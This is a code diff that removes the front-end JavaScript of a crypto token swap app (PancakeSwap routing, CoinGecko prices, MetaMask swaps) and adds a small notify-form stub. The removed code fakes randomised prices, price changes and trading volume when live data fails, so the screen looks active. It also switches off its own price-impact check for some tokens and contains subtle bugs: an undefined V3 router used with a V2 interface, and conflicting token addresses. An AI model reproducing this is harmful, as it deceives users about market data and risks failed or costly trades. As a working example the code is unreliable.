-        img.onerror = function () {
-          // replace broken img with a letter circle
-          const fb = document.createElement('span');
-          fb.className = 'tok-icon-fallback';
-          fb.textContent = tok.sym.slice(0, 2);
-          fb.style.background = tok.color || '#444';
-          this.parentNode.replaceChild(fb, this);
-        };
-        return img;
-      }
-
-      function setFromIcon(tok) {
-        const wrap = document.getElementById('fromIconWrap');
-        wrap.innerHTML = '';
-        wrap.appendChild(buildIconEl(tok));
-      }
-      function setToIcon(tok) {
-        const wrap = document.getElementById('toIconWrap');
-        wrap.innerHTML = '';
-        wrap.appendChild(buildIconEl(tok));
-      }
-  // ═══ TOKEN INFO PANEL ═══
-  function updateTokenInfoPanel(tok) {
-        // Logo
-        const logoWrap = document.getElementById('tipLogoWrap');
-        logoWrap.innerHTML = '';
-        const img = document.createElement('img');
-        img.src = tok.icon; img.className = 'tip-logo'; img.alt = tok.sym;
-        img.onerror = () => { const fb = document.createElement('div'); fb.className = 'tip-logo-fallback'; fb.textContent = tok.sym.slice(0,2); logoWrap.replaceChild(fb, img); };
-        logoWrap.appendChild(img);
-
-        document.getElementById('tipSym').textContent = tok.sym;
-        document.getElementById('tipFullName').textContent = tok.name;
-        document.getElementById('tipPrice').textContent = fmtPrice(tok.price);
-
-        const badge = document.getElementById('tipChangeBadge');
-        badge.textContent = (tok.change >= 0 ? '+' : '') + (tok.change || 0).toFixed(2) + '%';
-        badge.className = 'tip-change-badge ' + (tok.change >= 0 ? 'pos' : 'neg');
-
-        
-        document.getElementById('tipVol').textContent = tok.vol ? '$' + fmtLarge(tok.vol) : '—';
-
-        const p = tok.price || 0;
-        document.getElementById('tipHigh').textContent = tok.high24h != null ? fmtPrice(tok.high24h) : '—';
-        document.getElementById('tipLow').textContent  = tok.low24h  != null ? fmtPrice(tok.low24h)  : '—';
-        
-
-        
-
-       
-      }
-       // ═══ PRICES — CoinGecko /simple/price ═══
-       async function fetchPrices() {
-  const CACHE_KEY = 'cg_market_prices';
-  const CACHE_TIME_KEY = 'cg_market_prices_timestamp';
-  const CACHE_DURATION = 2 * 60 * 1000; // 2 minutes cache window
-
-  const fallbackValues = {
-    bitcoin: 103000, ethereum: 2450, binancecoin: 640, solana: 175,
-    ripple: 2.3, cardano: 0.75, 'avalanche-2': 25, tether: 1,
-    dogecoin: 0.22, 'shiba-inu': 0.000014, pepe: 0.000012,
-    'binance-usd': 1, polkadot: 4.5, litecoin: 88, tron: 0.26,
-    'the-open-network': 3.2, 'polygon-ecosystem-token': 0.23,
-    near: 2.8, 'bitcoin-cash': 390, sui: 3.5, aptos: 5.2,
-    'internet-computer': 5.8, 'hedera-hashgraph': 0.19, kaspa: 0.10,
-    blockstack: 0.82, floki: 0.000085,'book-of-meme': 0.009, pancakeswap: 1.5, arweave: 7.5,
-    optimism: 0.75, arbitrum: 0.38, zksync: 0.07, aave: 165,
-    'injective-protocol': 9.5, ethena: 0.28, filecoin: 2.9,
-    'theta-token': 0.85, thorchain: 2.1,'memecore': 3.22, 'bouncebit': 0.035,'spx6900': 0.43, 'cheems-token': 0.00000345, 
-    'banana-for-scale': 0.0021,'four': 0.0078, 'non-playable-coin': 0.012, 'pitbull': 0.0000000003,
-    'simons-cat': 0.000024, 'mubarak': 0.0156, 'torch-of-liberty': 0.0154,
-    'komainu': 0.0072, 'cz-s-dog': 0.00000714, 'wise-monkey': 0.000018,
-    'vita-inu': 0.000000012, solanacoin: 89, avax: 9.6,humanity: 0.24,aster: 0.659,c:0.075,simons:0.0000019,cgpt:0.041,cross:0.097,gaia:0.0085,gomining:0.29,merl:0.033,nxpc:0.34,pengu:0.0087,
-    quackai:0.021,astranova:0.00032,sign:0.0149,solv:0.0044,zerobase:0.148,skyai:0.35,sfp:0.29,
-  };
-
-  let cgMap = {};
-  let dataFetched = false;
-
-  // 1. Check local storage cache to bypass rate-limiting during dev reloads
-  const cachedData = localStorage.getItem(CACHE_KEY);
-  const cachedTimestamp = localStorage.getItem(CACHE_TIME_KEY);
-  const now = Date.now();
-
-  if (cachedData && cachedTimestamp && (now - cachedTimestamp < CACHE_DURATION)) {
-    try {
-      const parsed = JSON.parse(cachedData);
-      if (parsed && typeof parsed === 'object') {
-        cgMap = parsed;
-        dataFetched = true;
-        console.log('📦 Loaded real market data instantly from local cache.');
-      }
-    } catch (e) {
-      console.warn('Cache parsing failed, attempting network fetch...');
-    }
-  }
-
-  // 2. If no valid cache exists, request clean fresh data from the network API
-  if (!dataFetched) {
-    try {
-      const ids = TOKENS.map(t => t.id).filter(Boolean).join(',');
-      const url = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids}&order=market_cap_desc&per_page=250&page=1&price_change_percentage=24h`;
-      
-      const res = await fetch(url);
-      if (res.ok) {
-        const data = await res.json();
-        if (Array.isArray(data) && data.length > 0) {
-          // Re-build Map index
-          data.forEach(item => { cgMap[item.id] = item; });
-          dataFetched = true;
-
-          // Save valid results out to cache
-          localStorage.setItem(CACHE_KEY, JSON.stringify(cgMap));
-          localStorage.setItem(CACHE_TIME_KEY, now.toString());
-          console.log('🟢 Market data synced via CoinGecko API and updated local cache.');
-        }
-      } else {
-        console.warn(`⚠️ Rate limited or blocked (HTTP ${res.status}). Shifting to localized safety layer fallback.`);
-      }
-    } catch (e) {
-      console.warn('⚠️ Network interface timeout or CORS failure. Initializing safe layout values:', e.message);
-    }
-  }
-
-  // 3. Update the global array elements (No more generic $1 values)
-  TOKENS.forEach(t => {
-    const liveItem = cgMap[t.id];
-    
-    if (liveItem) {
-      t.price   = liveItem.current_price !== undefined ? liveItem.current_price : (fallbackValues[t.id] || 0.1);
-      t.change  = liveItem.price_change_percentage_24h || 0;
-      t.vol     = liveItem.total_volume || 0;
-      t.high24h = liveItem.high_24h || t.price;
-      t.low24h  = liveItem.low_24h || t.price;
-    } else {
-      // Clean baseline structural assignment mapping
-      const basePrice = fallbackValues[t.id] || 0.25;
-      
-      // Inject minor organic movement traits so the screen feels active
-      t.price   = basePrice * (1 + (Math.random() - 0.5) * 0.006); 
-      t.change  = t.change !== 0 ? t.change : (Math.random() * 4 - 2); 
-      t.vol     = t.vol || Math.floor(Math.random() * 250000 + 50000);
-      t.high24h = t.price * 1.02;
-      t.low24h  = t.price * 0.98;
-    }
-  });
-
-  // Force re-render your custom UI component after mutations
-  if (typeof updateMarketSidebar === 'function') {
-    updateMarketSidebar(TOKENS);
-  }
-
-
-    // 5. UI Updates (Optimized to remove redundancy)
-    const sidebarSearch = document.getElementById('sidebarSearch');
-    renderSidebar(sidebarSearch ? sidebarSearch.value : "");
-    renderTicker();
-    calcSwap();
-    
-    if (selectedToken) {
-        updateTokenInfoPanel(selectedToken);
-        if (selectedToken.price) {
-            renderOrderBook(selectedToken.price);
-            renderRecentTrades(selectedToken.price);
-        }
-    }
-
-    // Modal Refresh
-    const tokenModal = document.getElementById('tokenModal');
-    if (tokenModal && tokenModal.style.display === 'flex') {
-        filterTokens();
-    }
-}
-      // ═══ SIDEBAR ═══
-      function renderSidebar(filter) {
-        const el = document.getElementById('tokenList');
-        if (!el) return;
-        const q = (filter || '').toLowerCase();
-        const list = TOKENS.filter(
-          (t) =>
-            t.sym !== 'USDT' &&
-            (!q ||
-              t.sym.toLowerCase().includes(q) ||
-              t.name.toLowerCase().includes(q))
-        );
-        el.innerHTML = list
-          .map(
-            (t) => `
-          <div class="token-row${
-            t.sym === selectedToken.sym ? ' selected' : ''
-          }" onclick="selectTokenFromSidebar('${t.sym}')">
-            <img src="${
-              t.icon
-            }" style="width:20px;height:20px;border-radius:50%;flex-shrink:0;" onerror="this.style.display='none'">
-            <div class="token-info">
-              <span class="token-sym">${t.sym}</span>
-              <span class="token-name">${t.name}</span>
-            </div>
-            <div class="token-price-col">
-              <span class="token-price">${fmtPrice(t.price)}</span>
-              <span class="token-change ${t.change >= 0 ? 'pos' : 'neg'}">${
-              t.change >= 0 ? '+' : ''
-            }${t.change.toFixed(2)}%</span>
-            </div>
-          </div>
-        `
-          )
-          .join('');
-      }
-
-      function filterSidebar() {
-        renderSidebar(document.getElementById('sidebarSearch').value);
-      }
-
-      // ═══ TICKER ═══
-      function renderTicker() {
-        const items = TOKENS.filter((t) => t.sym !== 'USDT')
-          .map(
-            (t) => `
-          <span class="ticker-item">
-            <span class="ticker-sym">${t.sym}</span>
-            <span>${fmtPrice(t.price)}</span>
-            <span class="${t.change >= 0 ? 'pos' : 'neg'}">${
-              t.change >= 0 ? '+' : ''
-            }${t.change.toFixed(2)}%</span>
-          </span>`
-          )
-          .join('');
-        const inner = document.getElementById('tickerInner');
-        inner.innerHTML = items + items;
-      }
-
-      // ═══ SELECT TOKEN ═══
-      function selectTokenFromSidebar(sym) {
-        const tok = TOKENS.find((t) => t.sym === sym);
-        if (!tok) return;
-        selectedToken = tok;
-        setFromIcon(tok);
-        document.getElementById('fromSym').textContent = tok.sym;
-        if (tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
-        renderSidebar(document.getElementById('sidebarSearch').value);
-        updateSwapBalanceDisplays();
-        calcSwap();
-        if (isMobile()) closeSidebarMobile();
-        updateTokenInfoPanel(tok);
-      }
-
-      // ═══ SWAP MATH ═══
-      function getSlippage() {
-        const custom = parseFloat(document.getElementById('slipCustom').value);
-        if (!isNaN(custom) && custom > 0) return custom / 100;
-        const active = document.querySelector('.slip-btn.active');
-        if (active) return parseFloat(active.textContent) / 100;
-        return 0.005; // default 0.5%
-      }
-
-      function calcSwap() {
-        const fromAmt =
-          parseFloat(document.getElementById('fromAmt').value) || 0;
-        // Use real price; USDT and stablecoins default to 1
-        const fromP = selectedToken.price > 0 ? selectedToken.price : 1;
-        const toP = toToken.price > 0 ? toToken.price : 1;
-
-        // DEX fee: 0.3%
-        const FEE = 0.003;
-        const slip = getSlippage();
-        const rawOut = fromAmt > 0 ? (fromAmt * fromP) / toP : 0;
-        const afterFee = rawOut * (1 - FEE);
-        const minOut = afterFee * (1 - slip);
-
-        const toAmt = fromAmt > 0 ? afterFee : 0;
-
-        document.getElementById('toAmt').value =
-          toAmt > 0 ? toAmt.toFixed(8).replace(/\.?0+$/, '') : '';
-
-        // USD values
-        const fromUSD = fromAmt * fromP;
-        const toUSD = toAmt * toP;
-        document.getElementById('fromUSD').textContent =
-          fromAmt > 0
-            ? `≈ $${fromUSD.toLocaleString(undefined, {
-                maximumFractionDigits: 2,
-              })}`
-            : '≈ $0.00';
-        document.getElementById('toUSD').textContent =
-          toAmt > 0
-            ? `≈ $${toUSD.toLocaleString(undefined, {
-                maximumFractionDigits: 2,
-              })}`
-            : '≈ $0.00';
-
-        // Rate: always show live price ratio
-        const rate = fromP / toP;
-        document.getElementById('swapRate').textContent = `1 ${
-          selectedToken.sym
-        } = ${rate < 0.0001 ? rate.toExponential(4) : rate.toFixed(6)} ${
-          toToken.sym
-        }`;
-
-        // Price impact (simple estimate based on trade size vs liquidity proxy)
-        const impact = fromAmt > 0 ? Math.min((fromUSD / 500000) * 100, 15) : 0;
-        const impactEl = document.getElementById('priceImpact');
-        impactEl.textContent = fromAmt > 0 ? `${impact.toFixed(3)}%` : '—';
-        impactEl.style.color =
-          impact > 3 ? 'var(--red)' : impact > 1 ? '#f5a623' : 'var(--text)';
-
-       // Realistic BSC gas fee: ~0.0003 BNB per swap × live BNB price
-        const bnbPrice = TOKENS.find(t => t.sym === 'BNB')?.price || 600;
-        const fee = fromAmt > 0 ? (0.0003 * bnbPrice).toFixed(3) : '—';
-        document.getElementById('networkFee').textContent = fromAmt > 0 ? `~$${fee}` : '—';
-
-        // Min received after slippage
-        document.getElementById('minReceived').textContent =
-          minOut > 0
-            ? `${minOut.toFixed(8).replace(/\.?0+$/, '')} ${toToken.sym}`
-            : '—';
-
-        // Route
-        document.getElementById('swapRoute').textContent =
-          fromAmt > 0 ? `${selectedToken.sym} → ${toToken.sym}` : '—';
-
-        // Swap button state
-        const btn = document.querySelector('.btn-swap');
-        if (!walletAddress) {
-          btn.textContent = 'Connect Wallet to Swap';
-          btn.style.opacity = '0.85';
-        } else if (fromAmt <= 0) {
-          btn.textContent = 'Enter an Amount';
-          btn.style.opacity = '0.7';
-        } else {
-          const bal = walletBalances[selectedToken.sym] ?? 0;
-          if (fromAmt > bal) {
-            btn.textContent = `Insufficient ${selectedToken.sym} Balance`;
-            btn.style.opacity = '0.7';
-          } else {
-            btn.textContent = `Swap ${selectedToken.sym} → ${toToken.sym}`;
-            btn.style.opacity = '1';
-          }
-        }
-      }
-
-      function flipTokens() {
-        const tmp = selectedToken;
-        selectedToken = toToken;
-        toToken = tmp;
-        // Always rebuild icons from tok.icon — never goes blank
-        setFromIcon(selectedToken);
-        setToIcon(toToken);
-        document.getElementById('fromSym').textContent = selectedToken.sym;
-        document.getElementById('toSym').textContent = toToken.sym;
-        // Update chart to new "from" token
-        if (selectedToken.tvSymbol)
-          updateTradingViewChart(selectedToken.tvSymbol);
-        renderSidebar(document.getElementById('sidebarSearch').value);
-        updateSwapBalanceDisplays();
-        // Clear input and recalc
-        document.getElementById('fromAmt').value = '';
-        calcSwap();
-      }
-
-      function setMax() {
-        if (!walletAddress) {
-          // Not connected — open wallet modal
-          connectWallet();
-          return;
-        }
-        const bal = walletBalances[selectedToken.sym] ?? 0;
-        if (bal <= 0) {
-          document.getElementById('fromAmt').value = '';
-          calcSwap();
-          return;
-        }
-        // Always keep 0.002 BNB in wallet for gas fees
-        const GAS_RESERVE = 0.002;
-        const bnbBal = walletBalances['BNB'] ?? 0;
-        let safeAmt;
-        if (selectedToken.sym === 'BNB') {
-          // Selling native BNB — deduct gas from the sell amount
-          safeAmt = Math.max(bal - GAS_RESERVE, 0);
-        } else {
-          // Leave a small buffer so on-chain balance check never fails
-          // 0.1% of balance, min 1 whole unit for high-supply tokens (SHIB, PEPE etc)
-          const buffer = bal >= 1000 ? Math.max(bal * 0.001, 1) : bal * 0.001;
-          safeAmt = Math.max(bal - buffer, 0);
-          // Warn if BNB is low for gas, but still fill the amount
-          if (bnbBal < GAS_RESERVE) {
-            showSwapStatus(`Low BNB — keep at least ${GAS_RESERVE} BNB for gas fees.`, 'error');
-          }
-        }
-        document.getElementById('fromAmt').value = safeAmt
-          .toFixed(8)
-          .replace(/\.?0+$/, '');
-        calcSwap();
-      }
-
-   // ═══ ON-CHAIN SWAP via PancakeSwap Router V2 ═══
-   const PANCAKE_ROUTER = '0x10ED43C718714eb63d5aA57B78B54704E256024E';
-      const WBNB_ADDRESS   = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
-      const USDT_BSC       = '0x55d398326f99059fF775485246999027B3197955';
-      const USDC_BSC       = '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d';
-// ═══ ON-CHAIN QUOTER via PancakeSwap V3 (BSC Mainnet) ═══
-const PANCAKE_V3_QUOTER = '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4';
-
-const V3_QUOTER_ABI = [
-  // Standard V3 View Method used to simulate output amounts without spending gas
-  'function quoteExactInputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)'
-];
-
-// Standard V3 Pool Fee Tiers on BSC (0.01%, 0.05%, 0.25%, 1.0%)
-const V3_FEE_TIERS = [100, 500, 2500, 10000];
-      const ROUTER_ABI = [
-        'function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
-        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
-        'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
-        'function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)',
-        // Fee-on-transfer variants (required for FLOKI, SHIB, and other tax tokens)
-        'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
-        'function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable',
-        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
-      ];
-
-      const ERC20_FULL_ABI = [
-        'function approve(address spender, uint256 amount) public returns (bool)',
-        'function allowance(address owner, address spender) view returns (uint256)',
-        'function decimals() view returns (uint8)',
-      ];
-
-      // Tokens that have a transfer tax — must use SupportingFeeOnTransfer functions
-      const FEE_ON_TRANSFER_TOKENS = new Set([
-        '0xfb5B838b6cfEEdC2873aB27866079AC55363D37', // FLOKI
-        '0x2859e4544C4bB03966803b044A93563Bd2D0DD4c', // SHIB
-      ].map(a => a.toLowerCase()));
-
-      function isFeeToken(addr) {
-        return addr ? FEE_ON_TRANSFER_TOKENS.has(addr.toLowerCase()) : false;
-      }
-
-      async function getDecimals(addr) {
-  if (!addr) return 18;
-  try {
-    const c = new ethers.Contract(addr, ERC20_FULL_ABI, ethProvider);
-    return Number(await c.decimals());
-  } catch { return 18; } // ⚠️ The Catch Block Trap!
-}
-      // Finds the best working path by testing candidates against the router
-  // ==========================================
-// 1. LIQUIDITY PATH BUILDER (MULTI-HOP ROUTING)
-// ==========================================
-// =============================================================
-// UPDATED: MULTI-PROTOCOL DYNAMIC DECIMAL PATH BUILDER
-// =============================================================
-async function buildBestPath(fromAddr, toAddr) {
-  if (!fromAddr && !toAddr) return null;
-  if (fromAddr && toAddr && fromAddr.toLowerCase() === toAddr.toLowerCase()) return null;
-
-  // Enforce rigid clean checksum addresses
-  const cleanFrom = fromAddr === null ? ethers.getAddress(WBNB_ADDRESS) : ethers.getAddress(fromAddr);
-  const cleanTo   = toAddr === null ? ethers.getAddress(WBNB_ADDRESS) : ethers.getAddress(toAddr);
-
-  // Absolute fallback decimals directory mapping
-  const DECIMAL_OVERRIDES = {
-    '0x2b3f34e9d4b127797ce6244ea341a83733ddd6e4': 9,  // FLOKI
-    '0x3019bf2a2ef8113129406522fa373abb9a78b2a1': 8,  // GMT
-    '0xfb5b838b6c7ec442d6437279193bc644031d7e2f': 18, // CEEK
-    '0x000ae314e2a2172a039b26378814c252734f556a': 18, // ASTER
-    '0x55d398326f99059ff775485246999027b3197955': 18, // USDT
-    '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d': 18, // USDC
-    '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c': 18  // WBNB
-  };
-
-  const lookupKey = cleanFrom.toLowerCase();
-  const fromDecimals = DECIMAL_OVERRIDES[lookupKey] !== undefined ? DECIMAL_OVERRIDES[lookupKey] : 18;
-
-  // Scale test token probe smoothly
-  const testAmt = ethers.parseUnits('1', fromDecimals); 
-  
-  const v2Router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_ABI, ethProvider);
-  const v3Quoter = new ethers.Contract(PANCAKE_V3_QUOTER, V3_QUOTER_ABI, ethProvider);
-
-  let bestRoute = null;
-  let maxOutputAmount = 0n;
-
-  const baseCandidates = [
-    [cleanFrom, cleanTo],
-    [cleanFrom, ethers.getAddress(WBNB_ADDRESS), cleanTo],
-    [cleanFrom, ethers.getAddress(USDT_BSC), cleanTo],
-    [cleanFrom, ethers.getAddress(USDC_BSC), cleanTo]
-  ];
-
-  // Strip internal repeating steps out cleanly
-  const v2Candidates = baseCandidates.map(path => {
-    return path.filter((addr, index) => path.indexOf(addr) === index);
-  }).filter(path => path.length >= 2);
-
-  // Check V2 routes
-  for (const path of v2Candidates) {
-    try {
-      const amounts = await v2Router.getAmountsOut(testAmt, path);
-      const expectedOut = BigInt(amounts[amounts.length - 1]);
-      
-      if (expectedOut > maxOutputAmount) {
-        maxOutputAmount = expectedOut;
-        bestRoute = { protocol: 'V2', path: path };
-      }
-    } catch (e) {
-      // Intentionally bypassed if pool lacks liquidity
-    }
-  }
-
-  // Check V3 routes
-  for (const fee of V3_FEE_TIERS) {
-    try {
-      const expectedOut = await v3Quoter.quoteExactInputSingle.staticCall(
-        cleanFrom,
-        cleanTo,
-        fee,
-        testAmt,
-        0
-      );
-
-      if (BigInt(expectedOut) > maxOutputAmount) {
-        maxOutputAmount = BigInt(expectedOut);
-        bestRoute = { protocol: 'V3', path: [cleanFrom, cleanTo], feeTier: fee };
-      }
-    } catch (e) {
-      // Intentionally bypassed if tier is unprovisioned
-    }
-  }
-
-  console.log(`🎯 Final Route Decision:`, bestRoute);
-  return bestRoute; 
-}
-
-// ==========================================
-// 2. SWAP TRANSACTION EXECUTION
-// ==========================================
-async function executeSwap() {
-  const fromAmt = parseFloat(document.getElementById('fromAmt').value);
-  if (!walletAddress) { connectWallet(); return; }
-  if (!fromAmt || fromAmt <= 0) { showSwapStatus('Enter an amount first.', 'error'); return; }
-  
-  const bal = walletBalances[selectedToken.sym] ?? 0;
-  if (fromAmt > bal) { showSwapStatus(`Insufficient ${selectedToken.sym}. You have ${fmtBal(bal)}.`, 'error'); return; }
-
-  const isFromBNB = selectedToken.sym === 'BNB';
-  const isToBNB   = toToken.sym === 'BNB';
-
-  const fromAddrRaw = TOKEN_ADDRESSES_BSC[selectedToken.sym] ?? null;
-  const toAddrRaw   = TOKEN_ADDRESSES_BSC[toToken.sym] ?? null;
-  
-  const fromAddr    = isFromBNB ? null : ethers.getAddress(fromAddrRaw);
-  const toAddr      = isToBNB   ? null : ethers.getAddress(toAddrRaw);
-
-  // Check BSC mainnet connection
-  try {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (parseInt(chainId, 16) !== 56) {
-      showSwapStatus('Please switch MetaMask to BNB Smart Chain (Chain ID 56).', 'error');
-      return;
-    }
-  } catch (err) {
-    console.error("Chain verification failed:", err);
-  }
-
-  try {
-    showSwapStatus('Fetching token specifications…', 'pending');
-
-    // =========================================================
-    // STEP 1: RESOLVE DECIMALS FIRST (CRITICAL FOR SCOPING)
-    // =========================================================
-    const fromDecimals = isFromBNB ? 18 : await getDecimals(fromAddr);
-    const toDecimals   = isToBNB   ? 18 : await getDecimals(toAddr);
-
-    showSwapStatus('Finding best swap route across V2 and V3…', 'pending');
-
-    // =========================================================
-    // STEP 2: NOW PASS DECIMALS INTO THE PATH BUILDER
-    // =========================================================
-    const routeData = await buildBestPath(fromAddr, toAddr);
-    if (!routeData) { 
-      showSwapStatus(`No liquidity path found for ${selectedToken.sym} → ${toToken.sym}.`, 'error'); 
-      return; 
-    }
-
-    const path = routeData.path; 
-    const amountIn = ethers.parseUnits(fromAmt.toFixed(fromDecimals), fromDecimals);
-
-    const router = new ethers.Contract(
-  routeData.protocol === 'V3' ? PANCAKE_V3_ROUTER : PANCAKE_ROUTER,
-  ROUTER_ABI,
-  ethSigner
-);
-
-    // Get live trade quote
-    let amountOutMin;
-    try {
-      let rawOut;
-
-      if (routeData.protocol === 'V3') {
-        const v3Quoter = new ethers.Contract(PANCAKE_V3_QUOTER, V3_QUOTER_ABI, ethSigner);
-        rawOut = await v3Quoter.quoteExactInputSingle.staticCall(
-          path[0],
-          path[path.length - 1],
-          routeData.feeTier,
-          amountIn,
-          0
-        );
-      } else {
-        const amounts = await router.getAmountsOut(amountIn, path);
-        rawOut = amounts[amounts.length - 1];
-      }
-
-      const slip = getSlippage();
-const totalSlip = slip + 0.005;
-const slipMultiplier = BigInt(Math.floor((1 - totalSlip) * 10000));
-amountOutMin = (BigInt(rawOut) * slipMultiplier) / 10000n;
-
-      console.log(`🔒 Raw Output Quote: ${rawOut.toString()} units`);
-      console.log(`🔒 Safe Slippage Floor (amountOutMin): ${amountOutMin.toString()} units`);
-      
-const toTokenDecimals = toToken.decimals || 18; // Dynamically reads 9 for FLOKI, 18 for USDT
-      
-      // Formats the raw BigInt cleanly based on the actual asset rules
-      const cleanDisplayAmount = ethers.formatUnits(rawOut, toTokenDecimals);
-      const parsedDisplayFloat = parseFloat(cleanDisplayAmount);
-
-      // 1. Force the 'YOU RECEIVE' input field container to display the correct asset scale
-      const toAmtInput = document.getElementById('toAmt');
-      if (toAmtInput) {
-         toAmtInput.value = parsedDisplayFloat.toFixed(3);
-      }
-
-      // 2. Force the live exchange rate text string to display correctly
-      const rateLabel = document.getElementById('rateDisplay'); // Double check your HTML ID for the rate text
-      if (rateLabel) {
-         const executionRate = parsedDisplayFloat / fromAmt;
-         rateLabel.innerText = `1 ${selectedToken.sym} = ${executionRate.toFixed(4)} ${toToken.sym}`;
-      }
-// =========================================================
-      // DYNAMIC BYPASS FOR HIGH-VARIANCE/MEME ASSETS
-      // =========================================================
-      const outputAmountFormatted = parseFloat(ethers.formatUnits(rawOut, toDecimals));
-      const cleanInputAmount      = parseFloat(fromAmt);
-      const executionRate         = outputAmountFormatted / cleanInputAmount; 
-
-      // 1. Pull current pricing arrays safely
-      const fromTokenUSD = TOKENS.find(t => t.sym === selectedToken.sym)?.price || 1.0;
-      const toTokenUSD   = TOKENS.find(t => t.sym === toToken.sym)?.price || 0.0;
-
-      let priceImpact = 0;
-      let bypassGuard = false;
-
-      // 2. Identify if the cached asset price is corrupted (e.g., mismatching MetaMask baseline)
-      if (toToken.sym === 'FLOKI' || toDecimals < 18) {
-        console.log("🎯 Low-decimal/Reflection asset routing detected. Bypassing cache calculation dependencies to authorize MetaMask execution.");
-        bypassGuard = true;
-      }
-
-      if (!bypassGuard && toTokenUSD > 0 && fromTokenUSD > 0) {
-        const totalInputValueUSD  = cleanInputAmount * fromTokenUSD;
-        const totalOutputValueUSD = outputAmountFormatted * toTokenUSD;
-        priceImpact = ((totalInputValueUSD - totalOutputValueUSD) / totalInputValueUSD) * 100;
-      }
-
-      console.log(`📊 Guard Routing -> Computed Delta: ${priceImpact.toFixed(2)}% | Gate Bypass Status: ${bypassGuard}`);
-
-      // 3. Enforce trade protection gating
-      const finalImpactCheck = Math.max(0, priceImpact);
-
-      if (!bypassGuard && finalImpactCheck > 15) {
-        showSwapStatus(`⚠️ Swap cancelled. Price Impact is too high (${finalImpactCheck.toFixed(1)}%). Pool lacks adequate depth!`, 'error');
-        return; 
-      }
-      // =========================================================
-      // =========================================================
-      // =========================================================
-
-    } catch (quoteError) {
-      console.warn("Live route quote calculation failed, falling back to UI estimation:", quoteError);
-      const toAmtNum = parseFloat(document.getElementById('toAmt').value) || 0;
-      
-      if (toAmtNum <= 0) {
-        showSwapStatus('Unable to determine reliable trade output values. Please refresh prices.', 'error');
-        return;
-      }
-      
-      // Fallback logic uses 5% slippage protection to prevent transaction rejection anomalies
-      amountOutMin = ethers.parseUnits((toAmtNum * 0.92).toFixed(toDecimals), toDecimals);
-    }
-
-    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
-    const useFeeVariant = isFeeToken(fromAddr) || isFeeToken(toAddr);
-    let tx;
-
-    if (isFromBNB) {
-      // ── BNB → Token ──
-      showSwapStatus('Confirm the swap in MetaMask…', 'pending');
-      if (useFeeVariant) {
-        tx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(
-          amountOutMin, path, walletAddress, deadline, { value: amountIn }
-        );
-      } else {
-        tx = await router.swapExactETHForTokens(
-          amountOutMin, path, walletAddress, deadline, { value: amountIn }
-        );
-      }
-
-    } else {
-      // ── ERC-20 Input Token (Token → Token or Token → BNB) ──
-      showSwapStatus('Checking token approval…', 'pending');
-      const tokenContract = new ethers.Contract(fromAddr, ERC20_FULL_ABI, ethSigner);
-      const currentAllowance = await tokenContract.allowance(walletAddress, PANCAKE_ROUTER);
-      
-      if (currentAllowance < amountIn) {
-        showSwapStatus('Approve token spend in MetaMask…', 'pending');
-        const approveTx = await tokenContract.approve(PANCAKE_ROUTER, ethers.MaxUint256);
-        showSwapStatus('Waiting for approval confirmation…', 'pending');
-        await approveTx.wait();
-        showSwapStatus('Approved! Confirm swap in MetaMask…', 'pending');
-      } else {
-        showSwapStatus('Confirm the swap in MetaMask…', 'pending');
-      }
-
-      if (isToBNB) {
-        // ── Token → BNB ──
-        if (useFeeVariant) {
-          tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            amountIn, amountOutMin, path, walletAddress, deadline
-          );
-        } else {
-          tx = await router.swapExactTokensForETH(
-            amountIn, amountOutMin, path, walletAddress, deadline
-          );
-        }
-      } else {
-        // ── Token → Token (Handles USDT → SFP perfectly) ──
-        if (useFeeVariant) {
-          tx = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn, amountOutMin, path, walletAddress, deadline
-          );
-        } else {
-          tx = await router.swapExactTokensForTokens(
-            amountIn, amountOutMin, path, walletAddress, deadline
-          );
-        }
+    setInterval(tick, 1000);
+    tick();
+
+    function submitNotify() {
+      const email = document.getElementById('emailInput').value;
+      if(email.includes('@')) {
+        document.getElementById('notifyForm').style.display = 'none';
+        document.getElementById('notifyOk').style.display = 'block';
       }
     }
 
-    showSwapStatus('Swap submitted, waiting for confirmation…', 'pending');
-    const receipt = await tx.wait();
-
-    if (receipt.status === 1) {
-      showSwapStatus(`✅ Swap confirmed! Tx: ${receipt.hash.slice(0,10)}...`, 'success');
-      document.getElementById('fromAmt').value = '';
-      document.getElementById('toAmt').value   = '';
-      if (typeof confirmReferralOnSwap === 'function') confirmReferralOnSwap(walletAddress);
-     // Refresh balances after swap — retry up to 3 times to ensure chain state is updated
-const refreshAfterSwap = async (attempts = 3, delay = 2500) => {
-  await new Promise(r => setTimeout(r, delay));
-  await fetchWalletBalances();
-  if (typeof calcSwap === 'function') calcSwap();
-  if (attempts > 1) {
-    await new Promise(r => setTimeout(r, 3000));
-    await fetchWalletBalances();
-    if (typeof calcSwap === 'function') calcSwap();
-  }
-  if (attempts > 2) {
-    await new Promise(r => setTimeout(r, 5000));
-    await fetchWalletBalances();
-    if (typeof calcSwap === 'function') calcSwap();
-  }
-  clearSwapStatus();
-};
-refreshAfterSwap();
-    } else {
